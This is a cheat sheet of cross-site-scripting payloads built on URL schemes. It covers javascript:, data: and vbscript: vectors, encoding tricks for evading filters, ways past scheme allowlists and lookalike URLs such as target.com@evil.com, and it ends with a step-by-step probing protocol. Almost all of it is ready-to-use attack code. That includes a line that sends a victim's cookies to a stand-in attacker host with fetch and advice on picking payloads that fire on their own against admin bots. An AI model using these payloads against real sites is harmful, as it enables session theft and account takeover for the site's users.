# Protocol/scheme vectors — javascript:, data:, and the rest

Scheme-bearing attributes are code-execution channels. Each scheme
has its own parse rules, filter-evasion quirks, and context gates.

---

## 1. `javascript:` — the scheme that runs code

```html
<a href="javascript:alert(1)">x</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">
<button formaction="javascript:alert(1)">
<embed src="javascript:alert(1)">          -- some browsers
<object data="javascript:alert(1)">        -- some browsers
<isindex action="javascript:alert(1)">     -- legacy
<table background="javascript:alert(1)">   -- legacy
<svg><a href="javascript:alert(1)"><text>x</text></a></svg>
<math><a href="javascript:alert(1)"><mtext>x</mtext></a></math>
```

Where it fires vs needs-interaction:

```text
iframe src / embed / object          → fires on load
form action                          → on submit
button/input formaction              → on click
a href / svg a                       → on click
base href                            → poisons relative URLs
```

For admin-bot targets, prefer the autofire ones (iframe/embed/
object) or formaction on a button the bot WILL click.

### javascript: evasion — the scheme-name manglers

```javascript
javascript:alert(1)
JaVaScRiPt:alert(1)                      -- case-insensitive
java\tscript:alert(1)                    -- literal tab in name
java\nscript:alert(1)                    -- newline
java\rscript:alert(1)                    -- CR
 javascript:alert(1)                     -- leading space stripped
javascript :alert(1)                     -- space before colon — no
javascript&colon;alert(1)                -- entity colon (some parsers)
&#106avascript:alert(1)                  -- entity j
&#x6a;avascript:alert(1)                  -- hex entity j
&#0106;avascript:alert(1)                -- padded entity
javascript&#58;alert(1)                   -- entity colon
javascript%3Aalert(1)                     -- pct-colon — decoded-attr ctx
javascrip%74:alert(1)                     -- pct-char inside name
data:text/javascript,alert(1)             -- different scheme — see §2
```

The control-char family — real tab/newline/CR INSIDE the scheme name
are stripped by the URL parser → `javascript:` still recognized:

```javascript
java&#9;script:alert(1)      -- tab entity
java&#10;script:alert(1)     -- LF entity
java&#13;script:alert(1)     -- CR entity
java&#x09;script:alert(1)
java&#x0000009;script:alert(1)
```

### The `javascript:`+comment / multi-statement payloads

```javascript
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:fetch('//me/?c='+document.cookie)
javascript:var x=1;alert(1)          -- statements after ;
javascript://alert(1)                 -- // comment — no-op
javascript:eval(location.hash.slice(1))
javascript:eval(name)                  -- window.name carrier
javascript:`${alert(1)}`               -- template-call
javascript:top.eval('alert(1)')
```

Note: `javascript:` inside `href` needs the CLICK — it's still a
URL, not a script-block.

### Inside `src`/`data`/`action` attributes — no-click variants

```html
<iframe src=javascript:alert(1)>            -- loads on render
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<form action=javascript:alert(1)><input type=submit value=x>
<input type=image src=javascript:alert(1)>   -- dead (img loads it)
<isindex action=javascript:alert(1) type=submit>
```

`<img src=javascript:...>` NEVER works — img parses the URL's
response as image data.

---

## 2. `data:` — data-URI documents

```html
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<a href="data:text/html,<script>alert(1)</script>">x</a>
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
```

The data: document runs in its own origin — NOT the target's. For
exfil it's useless (no access to target cookies); for proof it's
fine (alert fires). The exception: `data:` inside `<embed>` of a
same-origin page inherits — historically only Firefox allowed.

`data:image/svg+xml,<svg onload=...>` — SVG inside data: — the SVG
carries script but `img`-loaded svg doesn't execute; embed/iframe
does.

### data: evasion

```javascript
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html,%3Cscript%3Ealert(1)%3C/script%3E   -- pct-encoded
data:text/html;charset=utf-8,<script>alert(1)</script>
data:;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==    -- no MIME
data:text/html,<img src=x onerror=alert(1)>           -- handler
data:image/svg+xml,<svg xmlns=... onload=alert(1)>
```

---

## 3. `vbscript:` — legacy IE scheme

```html
<a href="vbscript:msgbox(1)">x</a>
<bgsound src="vbscript:msgbox(1)">
```

Dead on every modern browser — only relevant for extremely legacy
targets. Keep as a try-once-and-move-on.

---

## 4. `view-source:` — the read-only scheme

```html
<a href="view-source:javascript:alert(1)">x</a>
```

`view-source:` renders the URL as text — javascript: inside it is
just shown. Dead end for XSS; useful for READING a page's source
without executing it (recon trick, not a vuln).

---

## 5. `file:`/`blob:`/`filesystem:` — local schemes

```html
<iframe src="file:///etc/passwd">          -- browser blocks —
                                           file: is local-only
<iframe src="blob:https://target/xxx">      -- your blob (same-origin)
<iframe src="filesystem:...">               -- deprecated API
```

`blob:` URLs you create inherit your page's origin — a `blob:` in
the target's page can't read your blob. Dead for cross-origin.

---

## 6. `about:`/`chrome:`/`resource:` — browser-internal schemes

```html
<iframe src="about:blank"><script>...</script></iframe>  -- dead —
   script inside iframe's src is just a URL, not markup
```

`about:blank` iframes CAN be written into via `document.write`
on the iframe's contentDocument — but that's your own scripting.

---

## 7. Scheme-allowlist bypasses — the `href` checkers

Filters that check the scheme:

```javascript
// "must start with http":
//me.com/x          -- protocol-relative — no scheme!
///me.com/x          -- triple-slash — still protocol-relative
////me.com/x
/\/me.com/x
https:me.com         -- no slashes — relative!
https:/me.com        -- one slash — relative!
https://me.com       -- absolute
http://me.com
HtTpS://me.com       -- case variant
&#104;ttps://me.com  -- entity h
javascript:alert(1)  -- the payload — if not blocked by name
```

`//me.com` — protocol-relative is THE bypass: no scheme at all,
inherits the page's scheme. Filters checking `^https?://` or
blocking `javascript:` by name both miss it.

```javascript
// absolute-URL checks bypassed by lookalikes:
https://target.com.evil.com        -- suffix
https://targetcom.evil.com          -- concat
https://target.com@evil.com          -- userinfo trick
https://evil.com#target.com          -- fragment
https://evil.com/target.com          -- path
```

The `@` trick — `https://target.com@evil.com/` goes to EVIL.com;
`target.com` is the userinfo. Filters checking `target.com` in the
URL miss the authority split.

---

## 8. The URL-attr table — which attr takes which scheme

| Attr | javascript: | data: | //proto-rel | blob: |
|---|---|---|---|---|
| `a href` | on click | on click | on click | on click |
| `iframe src` | on load | on load | on load | yes |
| `embed src` | on load | on load | on load | yes |
| `object data` | on load | on load | on load | yes |
| `form action` | on submit | on submit | on submit | yes |
| `formaction` | on click | on click | on click | yes |
| `img src` | NO | NO | yes (load) | yes (load) |
| `script src` | NO | module-import | yes | yes |
| `link href` | stylesheet | yes | yes | yes |
| `base href` | poisons | poisons | poisons | — |
| `meta refresh` | yes | yes | yes | yes |

---

## 9. The scheme-detection protocol

```text
1. find the URL-bearing attribute: href src action formaction data
2. test javascript:alert(1) — if it fires, done
3. test //me/x — protocol-relative? server fetches it?
4. test data:text/html,... — data-URI accepted?
5. test https://target.com@evil.com — userinfo split?
6. test &#x6a;avascript:alert(1) — entity-in-scheme?
```

Each probe names which scheme-family works — then pull the payloads
from the matching section.
